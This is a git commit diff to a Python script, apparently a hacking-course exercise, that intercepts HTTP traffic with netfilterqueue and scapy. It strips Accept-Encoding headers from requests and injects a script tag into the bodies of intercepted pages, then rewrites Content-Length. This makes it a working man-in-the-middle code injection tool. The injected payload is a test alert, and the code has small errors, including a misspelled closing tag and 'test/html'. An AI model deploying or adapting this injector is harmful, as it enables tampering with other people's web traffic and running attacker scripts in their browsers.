11455d5b5391ea8749f13255255e7f6583657ad7
trickdeath0 <70007454+trickdeath0@users.noreply.github.com>
2020-08-29 16:32:03 +0300

    Update code_injector_9.py

--- python/code_injector_9.py
+++ python/code_injector_9.py
@@ -2,6 +2,7 @@
 
 import netfilterqueue
 import scapy.all as scapy
+import re
 
 
 def set_load(packet, load):
@@ -14,11 +15,27 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+
                 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
+            #print(scapy_packet.show())
+            injection_code = "<script>alert('test');</sript>"
+            load = load.replace("</body>", injection_code + "</body>")
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search and "test/html" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+                #print(content_length)
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(str(new_packet))
 
     packet.accept()
 
